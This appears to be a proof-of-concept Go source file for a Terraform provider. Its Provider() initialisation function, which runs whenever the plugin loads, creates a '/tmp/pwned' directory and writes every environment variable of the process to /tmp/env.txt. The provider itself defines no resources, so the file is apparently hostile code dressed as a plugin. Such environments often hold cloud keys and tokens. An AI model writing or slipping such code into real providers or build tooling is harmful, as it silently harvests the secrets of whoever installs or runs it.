package provider

import (
    "fmt"
    "os"
    "github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

func Provider() *schema.Provider {
    
    err := os.Mkdir("/tmp/pwned", 0755)
    if err != nil && !os.IsExist(err) {
        fmt.Println("[!] Error: ", err)
    }

    file, err := os.Create("/tmp/env.txt")
	if err != nil {
		fmt.Println("Error creating file:", err)
	}
	defer file.Close()

	// Get all environment variables
	envVars := os.Environ()

	// Write each environment variable to the file
	for _, envVar := range envVars {
		_, err := file.WriteString(envVar + "\n")
		if err != nil {
			fmt.Println("Error writing to file:", err)
		}
	}   
    return &schema.Provider{
        ResourcesMap: map[string]*schema.Resource{        },
    }
}